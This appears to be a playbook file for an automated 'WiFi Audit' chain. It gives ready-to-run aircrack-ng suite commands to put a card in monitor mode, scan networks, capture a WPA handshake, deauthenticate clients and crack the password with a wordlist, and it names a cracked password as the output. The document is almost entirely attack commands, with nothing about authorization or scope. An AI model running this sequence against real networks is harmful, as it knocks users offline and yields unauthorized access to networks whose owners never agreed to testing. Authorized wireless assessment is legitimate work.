# Chain: WiFi Audit

## Trigger: Manual
## Purpose: Wireless network security assessment

### Steps

1. **Enable Monitor Mode**
```bash
airmon-ng start wlan0
```

2. **Discover Networks**
```bash
airodump-ng wlan0mon
```

3. **Capture Handshake**
```bash
airodump-ng -c CHANNEL --bssid MAC -w capture wlan0mon
```

4. **Deauth Attack**
```bash
aireplay-ng -0 5 -a MAC wlan0mon
```

5. **Crack**
```bash
aircrack-ng -w wordlist.txt capture-01.cap
```

### Output
- capture-*.cap (handshake)
- cracked.txt (password)
